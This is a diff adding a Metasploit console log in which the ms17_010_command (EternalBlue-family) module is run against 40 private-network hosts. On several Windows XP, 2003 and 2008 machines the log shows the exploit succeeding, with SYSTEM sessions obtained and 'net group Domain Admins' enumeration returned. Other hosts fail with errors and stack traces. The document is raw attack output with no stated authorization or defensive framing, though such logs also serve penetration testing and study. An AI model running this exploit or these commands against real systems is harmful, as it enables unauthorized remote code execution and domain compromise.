@@ -1,0 +1,401 @@
+[1m[34m[*][0m Spooling to file eternalblue_2.log...
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> run
+[0m
+[1m[34m[*][0m 10.20.31.10:445       - Target OS: Unix
+[1m[31m[-][0m 10.20.31.10:445       - Exploit unavailable for target OS.
+[1m[34m[*][0m 10.20.31.71:445       - Target OS: Windows 6.1
+[1m[31m[-][0m 10.20.31.71:445       - Exploit unavailable for target OS.
+[1m[34m[*][0m 10.100.101.6:445      - Target OS: Windows 7 Enterprise 7600
+[1m[31m[-][0m 10.100.101.6:445      - Unable to find accessible named pipe!
+[1m[34m[*][0m 10.100.101.31:445     - Target OS: Windows 5.1
+[1m[34m[*][0m 10.100.101.31:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.101.31:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.31:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.101.31:445     - 		[*] Trying stick 1 (x86)...Boom!
+[1m[34m[*][0m 10.100.101.31:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.101.31:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.101.31:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.31:445     - Reading from CONNECTION struct at: 0x822f9d80
+[1m[34m[*][0m 10.100.101.31:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.101.31:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.101.31:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.101.31:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain alpha.net.
+
+
+[1m[32m[+][0m 10.100.101.31:445     - Cleanup was successful
+[1m[34m[*][0m Scanned  4 of 40 hosts (10% complete)
+[1m[34m[*][0m 10.100.101.55:445     - Target OS: Unix
+[1m[31m[-][0m 10.100.101.55:445     - Exploit unavailable for target OS.
+[1m[34m[*][0m 10.100.101.90:445     - Target OS: Windows Server 2003 R2 3790 Service Pack 1
+[1m[34m[*][0m 10.100.101.90:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.101.90:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.90:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.101.90:445     - 		Trying stick 1 (x64)...Miss
+[1m[34m[*][0m 10.100.101.90:445     - 		[*] Trying stick 2 (x86)...Boom!
+[1m[34m[*][0m 10.100.101.90:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.101.90:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.101.90:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.90:445     - Reading from CONNECTION struct at: 0x858ccad8
+[1m[34m[*][0m 10.100.101.90:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.101.90:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.101.90:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.101.90:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain WORKGROUP.
+
+
+[1m[32m[+][0m 10.100.101.90:445     - Cleanup was successful
+[1m[34m[*][0m 10.100.101.99:445     - Target OS: Windows 6.1
+[1m[31m[-][0m 10.100.101.99:445     - Exploit unavailable for target OS.
+[1m[31m[-][0m 10.100.101.118:445    - Rex::Proto::SMB::Exceptions::LoginError: Login Failed: The server responded with error: STATUS_ACCESS_DENIED (Command=115 WordCount=0)
+[1m[34m[*][0m Scanned  8 of 40 hosts (20% complete)
+[1m[34m[*][0m 10.100.101.228:445    - Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
+[1m[34m[*][0m 10.100.101.228:445    - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.101.228:445    - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.228:445    - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.101.228:445    - 		[*] Trying stick 1 (x64)...Boom!
+[1m[34m[*][0m 10.100.101.228:445    - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.101.228:445    - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.101.228:445    - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.228:445    - Reading from CONNECTION struct at: 0xfffffa80052616a0
+[1m[34m[*][0m 10.100.101.228:445    - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.101.228:445    - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.101.228:445    - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.101.228:445    - Output for "net group "Domain Admins" /domain":
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.101.228:445    - Cleanup was successful
+[1m[34m[*][0m 10.100.101.246:445    - Target OS: Windows 7 Enterprise 7600
+[1m[31m[-][0m 10.100.101.246:445    - Unable to find accessible named pipe!
+[1m[34m[*][0m 10.100.103.31:445     - Target OS: Windows 5.1
+[1m[34m[*][0m 10.100.103.31:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.103.31:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.31:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.103.31:445     - 		[*] Trying stick 1 (x86)...Boom!
+[1m[34m[*][0m 10.100.103.31:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.103.31:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.103.31:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.31:445     - Reading from CONNECTION struct at: 0x823059b0
+[1m[34m[*][0m 10.100.103.31:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.103.31:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.103.31:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.103.31:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain gamma.net.
+
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.103.31:445     - Cleanup was successful
+[1m[31m[-][0m 10.100.103.74:445     - Rex::ConnectionTimeout: The connection timed out (10.100.103.74:445).
+[1m[34m[*][0m Scanned 12 of 40 hosts (30% complete)
+[1m[34m[*][0m 10.100.103.90:445     - Target OS: Windows Server 2003 R2 3790 Service Pack 1
+[1m[34m[*][0m 10.100.103.90:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.103.90:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.90:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.103.90:445     - 		Trying stick 1 (x64)...Miss
+[1m[34m[*][0m 10.100.103.90:445     - 		[*] Trying stick 2 (x86)...Boom!
+[1m[34m[*][0m 10.100.103.90:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.103.90:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.103.90:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.90:445     - Reading from CONNECTION struct at: 0x8588d3d8
+[1m[34m[*][0m 10.100.103.90:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.103.90:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.103.90:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.103.90:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain gamma.net.
+
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.103.90:445     - Cleanup was successful
+[1m[34m[*][0m 10.100.103.99:445     - Target OS: Windows 6.1
+[1m[31m[-][0m 10.100.103.99:445     - Exploit unavailable for target OS.
+[1m[31m[-][0m 10.100.103.118:445    - Rex::Proto::SMB::Exceptions::LoginError: Login Failed: The server responded with error: STATUS_ACCESS_DENIED (Command=115 WordCount=0)
+[1m[34m[*][0m 10.100.103.144:445    - Target OS: Windows 5.1
+[1m[34m[*][0m 10.100.103.144:445    - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.103.144:445    - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.144:445    - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.103.144:445    - 		[*] Trying stick 1 (x86)...Boom!
+[1m[34m[*][0m 10.100.103.144:445    - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.103.144:445    - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.103.144:445    - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.144:445    - Reading from CONNECTION struct at: 0x82286da8
+[1m[34m[*][0m 10.100.103.144:445    - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.103.144:445    - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.103.144:445    - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.103.144:445    - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain gamma.net.
+
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.103.144:445    - Cleanup was successful
+[1m[34m[*][0m Scanned 16 of 40 hosts (40% complete)
+[1m[34m[*][0m 10.100.103.228:445    - Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
+[1m[34m[*][0m 10.100.103.228:445    - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.103.228:445    - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.228:445    - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.103.228:445    - 		[*] Trying stick 1 (x64)...Boom!
+[1m[34m[*][0m 10.100.103.228:445    - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.103.228:445    - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.103.228:445    - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.228:445    - Reading from CONNECTION struct at: 0xfffffa8005de1020
+[1m[34m[*][0m 10.100.103.228:445    - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.103.228:445    - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.103.228:445    - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.103.228:445    - Output for "net group "Domain Admins" /domain":
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.103.228:445    - Cleanup was successful
+[1m[34m[*][0m 10.100.103.246:445    - Target OS: Windows 7 Enterprise 7600
+[1m[31m[-][0m 10.100.103.246:445    - Unable to find accessible named pipe!
+[1m[34m[*][0m 10.100.104.6:445      - Target OS: Windows 7 Enterprise 7600
+[1m[31m[-][0m 10.100.104.6:445      - Unable to find accessible named pipe!
+[1m[34m[*][0m 10.100.104.31:445     - Target OS: Windows 5.1
+[1m[34m[*][0m 10.100.104.31:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.104.31:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.104.31:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.104.31:445     - 		[*] Trying stick 1 (x86)...Boom!
+[1m[31m[-][0m 10.100.104.31:445     - Timeout::Error
+[1m[31m[-][0m 10.100.104.31:445     - execution expired
+[1m[31m[-][0m 10.100.104.31:445     - /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/sync/thread_safe.rb:36:in `select'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/sync/thread_safe.rb:36:in `select'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:75:in `rescue in read'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:69:in `read'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:159:in `block in timed_read'
+/usr/lib/ruby/2.3.0/timeout.rb:106:in `timeout'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:158:in `timed_read'
+/usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:72:in `smb_recv'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:1124:in `do_smb_echo'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:745:in `exploit_fish_barrel'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:40:in `eternal_pwn'
+/usr/share/metasploit-framework/modules/auxiliary/admin/smb/ms17_010_command.rb:68:in `run_host'
+/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
+/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
+[1m[34m[*][0m Scanned 20 of 40 hosts (50% complete)
+[1m[31m[-][0m 10.100.104.74:445     - Rex::ConnectionTimeout: The connection timed out (10.100.104.74:445).
+[1m[34m[*][0m 10.100.104.90:445     - Target OS: Windows Server 2003 R2 3790 Service Pack 1
+[1m[34m[*][0m 10.100.104.90:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.104.90:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.104.90:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.104.90:445     - 		Trying stick 1 (x64)...Miss
+[1m[34m[*][0m 10.100.104.90:445     - 		[*] Trying stick 2 (x86)...Boom!
+[1m[31m[-][0m 10.100.104.90:445     - Timeout::Error
+[1m[31m[-][0m 10.100.104.90:445     - execution expired
+[1m[31m[-][0m 10.100.104.90:445     - /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/sync/thread_safe.rb:36:in `select'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/sync/thread_safe.rb:36:in `select'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:75:in `rescue in read'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:69:in `read'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:159:in `block in timed_read'
+/usr/lib/ruby/2.3.0/timeout.rb:106:in `timeout'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:158:in `timed_read'
+/usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:72:in `smb_recv'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:1124:in `do_smb_echo'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:745:in `exploit_fish_barrel'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:40:in `eternal_pwn'
+/usr/share/metasploit-framework/modules/auxiliary/admin/smb/ms17_010_command.rb:68:in `run_host'
+/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
+/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
+[1m[34m[*][0m 10.100.104.144:445    - Target OS: Windows 5.1
+[1m[34m[*][0m 10.100.104.144:445    - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.104.144:445    - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.104.144:445    - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.104.144:445    - 		[*] Trying stick 1 (x86)...Boom!
+[1m[31m[-][0m 10.100.104.144:445    - Timeout::Error
+[1m[31m[-][0m 10.100.104.144:445    - execution expired
+[1m[31m[-][0m 10.100.104.144:445    - /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/sync/thread_safe.rb:36:in `select'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/sync/thread_safe.rb:36:in `select'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:75:in `rescue in read'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:69:in `read'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:159:in `block in timed_read'
+/usr/lib/ruby/2.3.0/timeout.rb:106:in `timeout'
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:158:in `timed_read'
+/usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:72:in `smb_recv'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:1124:in `do_smb_echo'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:745:in `exploit_fish_barrel'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:40:in `eternal_pwn'
+/usr/share/metasploit-framework/modules/auxiliary/admin/smb/ms17_010_command.rb:68:in `run_host'
+/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
+/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
+[1m[34m[*][0m 10.100.104.246:445    - Target OS: Windows 7 Enterprise 7600
+[1m[31m[-][0m 10.100.104.246:445    - Unable to find accessible named pipe!
+[1m[34m[*][0m Scanned 24 of 40 hosts (60% complete)
+[1m[34m[*][0m 10.100.105.6:445      - Target OS: Windows 7 Enterprise 7600
+[1m[31m[-][0m 10.100.105.6:445      - Unable to find accessible named pipe!
+[1m[34m[*][0m 10.100.105.31:445     - Target OS: Windows 5.1
+[1m[34m[*][0m 10.100.105.31:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.105.31:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.105.31:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.105.31:445     - 		[*] Trying stick 1 (x86)...Boom!
+[1m[34m[*][0m 10.100.105.31:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.105.31:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.105.31:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.105.31:445     - Reading from CONNECTION struct at: 0x822e03c8
+[1m[34m[*][0m 10.100.105.31:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.105.31:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.105.31:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.105.31:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain epsilon.net.
+
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.105.31:445     - Cleanup was successful
+[1m[34m[*][0m 10.100.105.90:445     - Target OS: Windows Server 2003 R2 3790 Service Pack 1
+[1m[34m[*][0m 10.100.105.90:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.105.90:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.105.90:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.105.90:445     - 		Trying stick 1 (x64)...Miss
+[1m[34m[*][0m 10.100.105.90:445     - 		[*] Trying stick 2 (x86)...Boom!
+[1m[34m[*][0m 10.100.105.90:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.105.90:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.105.90:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.105.90:445     - Reading from CONNECTION struct at: 0x860a2d48
+[1m[34m[*][0m 10.100.105.90:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.105.90:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.105.90:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.105.90:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain WORKGROUP.
+
+
+[1m[32m[+][0m 10.100.105.90:445     - Cleanup was successful
+[1m[34m[*][0m 10.100.105.99:445     - Target OS: Windows 6.1
+[1m[31m[-][0m 10.100.105.99:445     - Exploit unavailable for target OS.
+[1m[34m[*][0m Scanned 28 of 40 hosts (70% complete)
+[1m[31m[-][0m 10.100.105.118:445    - Rex::Proto::SMB::Exceptions::LoginError: Login Failed: The server responded with error: STATUS_ACCESS_DENIED (Command=115 WordCount=0)
+[1m[34m[*][0m 10.100.105.144:445    - Target OS: Windows 5.1
+[1m[34m[*][0m 10.100.105.144:445    - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.105.144:445    - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.105.144:445    - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.105.144:445    - 		[*] Trying stick 1 (x86)...Boom!
+[1m[34m[*][0m 10.100.105.144:445    - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.105.144:445    - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.105.144:445    - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.105.144:445    - Reading from CONNECTION struct at: 0x81ef7380
+[1m[34m[*][0m 10.100.105.144:445    - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.105.144:445    - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.105.144:445    - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.105.144:445    - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain epsilon.net.
+
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.105.144:445    - Cleanup was successful
+[1m[34m[*][0m 10.100.105.197:445    - Target OS: Windows 6.1
+[1m[31m[-][0m 10.100.105.197:445    - Exploit unavailable for target OS.
+[1m[34m[*][0m 10.100.105.228:445    - Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
+[1m[34m[*][0m 10.100.105.228:445    - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.105.228:445    - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.105.228:445    - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.105.228:445    - 		[*] Trying stick 1 (x64)...Boom!
+[1m[34m[*][0m 10.100.105.228:445    - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.105.228:445    - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.105.228:445    - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.105.228:445    - Reading from CONNECTION struct at: 0xfffffa8005237920
+[1m[34m[*][0m 10.100.105.228:445    - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.105.228:445    - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.105.228:445    - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.105.228:445    - Output for "net group "Domain Admins" /domain":
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.105.228:445    - Cleanup was successful
+[1m[34m[*][0m Scanned 32 of 40 hosts (80% complete)
+[1m[34m[*][0m 10.100.105.246:445    - Target OS: Windows 7 Enterprise 7600
+[1m[31m[-][0m 10.100.105.246:445    - Unable to find accessible named pipe!
+[1m[34m[*][0m 10.150.100.150:445    - Target OS: Windows 5.1
+[1m[34m[*][0m 10.150.100.150:445    - Filling barrel with fish... done
+[1m[34m[*][0m 10.150.100.150:445    - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.150.100.150:445    - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.150.100.150:445    - 		Trying stick 1 (x86)...Miss
+[1m[34m[*][0m 10.150.100.150:445    - <---------------- | Leaving Danger Zone | ---------------->
+[1m[31m[-][0m 10.150.100.150:445    - Unable to control groom transaction
+[1m[34m[*][0m 172.25.20.21:445      - Target OS: Windows Server 2008 R2 Standard 7600
+[1m[31m[-][0m 172.25.20.21:445      - Unable to find accessible named pipe!
+[1m[31m[-][0m 172.25.20.100:445     - Rex::Proto::SMB::Exceptions::ErrorCode
+[1m[31m[-][0m 172.25.20.100:445     - The server responded with error: STATUS_ACCESS_DENIED (Command=117 WordCount=0)
+[1m[31m[-][0m 172.25.20.100:445     - /usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:263:in `smb_recv_parse'
+/usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:1132:in `tree_connect'
+/usr/share/metasploit-framework/lib/rex/proto/smb/simpleclient.rb:137:in `connect'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client.rb:146:in `smb_login'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:33:in `eternal_pwn'
+/usr/share/metasploit-framework/modules/auxiliary/admin/smb/ms17_010_command.rb:68:in `run_host'
+/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
+/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
+[1m[34m[*][0m Scanned 36 of 40 hosts (90% complete)
+[1m[31m[-][0m 172.25.20.101:445     - Rex::Proto::SMB::Exceptions::ErrorCode
+[1m[31m[-][0m 172.25.20.101:445     - The server responded with error: STATUS_ACCESS_DENIED (Command=117 WordCount=0)
+[1m[31m[-][0m 172.25.20.101:445     - /usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:263:in `smb_recv_parse'
+/usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:1132:in `tree_connect'
+/usr/share/metasploit-framework/lib/rex/proto/smb/simpleclient.rb:137:in `connect'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client.rb:146:in `smb_login'
+/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:33:in `eternal_pwn'
+/usr/share/metasploit-framework/modules/auxiliary/admin/smb/ms17_010_command.rb:68:in `run_host'
+/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
+/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
+[1m[31m[-][0m 172.25.20.102:445     - Rex::Proto::SMB::Exceptions::LoginError: Login Failed: The server responded with error: STATUS_ACCOUNT_DISABLED (Command=115 WordCount=0)
+[1m[31m[-][0m 172.25.20.103:445     - Rex::Proto::SMB::Exceptions::LoginError: Login Failed: The server responded with error: STATUS_ACCOUNT_DISABLED (Command=115 WordCount=0)
+[1m[31m[-][0m 10.20.31.1:445        - Rex::ConnectionRefused: The connection was refused by the remote host (10.20.31.1:445).
+[1m[34m[*][0m Scanned 40 of 40 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> hosts[K[K[K[K[Kspool off
+[0m
